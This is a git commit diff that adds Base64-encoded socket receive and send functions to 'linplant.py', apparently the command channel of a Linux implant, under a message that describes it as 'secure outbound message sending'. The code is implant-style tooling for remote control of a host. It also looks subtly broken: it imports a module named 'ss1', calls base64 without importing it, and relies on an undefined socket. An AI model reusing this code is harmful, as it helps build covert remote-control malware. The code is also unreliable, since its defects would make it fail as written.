ad1601aa202afedb945b3c921f7184b9eab19e41
Matu Kahsay <108632333+matu-kahsay@users.noreply.github.com>
2024-02-27 11:40:52 -0800

    Add secure outbound message sending with Base64 encoding

--- linplant.py
+++ linplant.py
@@ -6,3 +6,19 @@ import pwd
 import platform
 import time
 import ss1
+
+def inbound():
+    message = ''
+    while True:
+        try:
+            message = sock.recv(1024).decode()
+            message = base64.b64decode(message)
+            message = message.decode().strip()
+            return message
+        except Exception:
+            sock.close()
+
+def outbound(message):
+    response = str(message)
+    response = base64.b64encode(bytes(response, encoding='utf8'))
+    sock.send(response)
